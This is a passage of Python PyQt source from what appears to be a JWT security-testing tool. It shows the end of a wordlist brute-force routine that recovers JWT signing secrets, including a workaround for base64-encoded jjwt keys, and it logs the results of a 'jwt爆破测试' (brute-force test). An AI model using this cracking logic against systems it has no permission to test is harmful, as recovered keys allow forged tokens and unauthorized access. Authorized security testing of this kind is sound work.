                    except Exception as jwt_decode_error:
                        # print(tmp_key.replace("\n",''),jwt_decode_error)
                        # 解决jjwt认证框架jwt解码bug
                        try:
                            secret = base64.b64decode(jwt_key[:len(jwt_key) - (len(jwt_key) % 4)])
                            jwt.decode(jwt_str, secret, algorithms=[self.alg])
                            brute_flag = True
                            tmp_jwt = jwt_key
                        except (jwt.ExpiredSignatureError, jwt.InvalidAudienceError, jwt.InvalidIssuedAtError,
                                jwt.ImmatureSignatureError) as jerror1:
                            brute_flag = True
                            tmp_jwt = jwt_key
                        except Exception as eeee:
                            print(eeee)
                            continue
        else:
            QMessageBox.warning(self, '警告', '您指定的字典文件路径不存在，请选择正确的字典路径！')

        if brute_flag:
            self.jwt_key = tmp_jwt
            try:
                data = jwt.decode(jwt_str, self.jwt_key, algorithms=[self.alg])
                if isinstance(data, dict):
                    print(data)
                    data = json.dumps(data)
            except Exception as aaa:
                data = "密钥虽然正确，但是有其他异常值，异常值为：" + str(aaa)
            self.key_edit.setText(self.jwt_key)
            print('爆破成功！，key:',self.jwt_key)
            # print('data的类型：',type(data))
            right_jwt_key = self.jwt_key
            if self.jwt_key == '':
                right_jwt_key = self.jwt_key + "(空token)"
            self.sec_result.append(
                {'test_id': 3, 'test_title': 'jwt爆破测试', 'status_code': '无',
                 'rep_length': '无',
                 'test_result': '爆破成功！',
                 'description': 'jwt爆破成功。', 'req_data': 'jwt爆破成功，key为：'+ right_jwt_key,
                 'rep_data': '解码数据为：'+ data, 'sec_flag': False})
            return True
        else:
            self.sec_result.append(
                {'test_id': 3, 'test_title': 'jwt爆破测试', 'status_code': '无',
                 'rep_length': '无',
                 'test_result': '爆破失败！',
                 'description': '爆破失败，未找到jwt的key！', 'req_data': '爆破失败，未找到jwt的key！',
                 'rep_data': '爆破失败，未找到jwt的key！', 'sec_flag': True})
            return False

if __name__ == '__main__':
    app = QApplication(sys.argv)

    w = MyWindow()
    w.show()

    app.exec()
